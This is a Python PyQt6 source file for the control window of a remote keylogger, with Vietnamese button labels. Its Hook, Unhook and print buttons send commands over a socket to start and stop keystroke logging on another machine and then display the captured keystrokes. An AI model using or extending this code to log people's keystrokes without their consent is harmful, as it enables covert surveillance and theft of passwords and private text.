from PyQt6.QtWidgets import (
    QWidget,
    QPushButton,
    QTextEdit,
    QVBoxLayout,
    QHBoxLayout,
)
import ctypes


class Keystroke(QWidget):

    def __init__(self, socket):
        super().__init__()

        self.socket = socket

        self.initUI()


    def initUI(self):

        user32 = ctypes.windll.user32

        desktop_width = user32.GetSystemMetrics(0)
        desktop_height = user32.GetSystemMetrics(1)

        width = int(desktop_width * 0.187)
        height = int(desktop_height * 0.127)

        self.resize(width, height)

        vbox1 = QVBoxLayout()

        hbox1 = QHBoxLayout()

        self.hook_button = QPushButton('Hook')
        self.hook_button.clicked.connect(self.hook)
        self.unhook_button = QPushButton('Unhook')
        self.unhook_button.setDisabled(True)
        self.unhook_button.clicked.connect(self.unhook)
        print_button = QPushButton('In Phím')
        print_button.clicked.connect(self.print)
        delete_button = QPushButton('Xóa')
        delete_button.clicked.connect(self.delete)

        hbox1.addWidget(self.hook_button)
        hbox1.addWidget(self.unhook_button)
        hbox1.addWidget(print_button)
        hbox1.addWidget(delete_button)

        self.textEdit = QTextEdit()
        self.textEdit.setReadOnly(True)

        vbox1.addLayout(hbox1)
        vbox1.addWidget(self.textEdit)

        self.setLayout(vbox1)
        self.setWindowTitle('Keystroke')
        self.show()

    def hook(self):
        self.socket.send(bytes('key_log_listening', 'utf-8'))
        self.hook_button.setDisabled(True)
        self.unhook_button.setDisabled(False)

    def unhook(self):
        self.socket.send(bytes('key_log_stop_listening', 'utf-8'))
        self.hook_button.setDisabled(False)
        self.unhook_button.setDisabled(True)

    def print(self):
        self.socket.send(bytes('get_key_log', 'utf-8'))

        data = self.socket.recv(2048).decode("utf-8")

        if data != "\\none":
            self.textEdit.insertPlainText(data)

    def delete(self):
        self.textEdit.setPlainText("")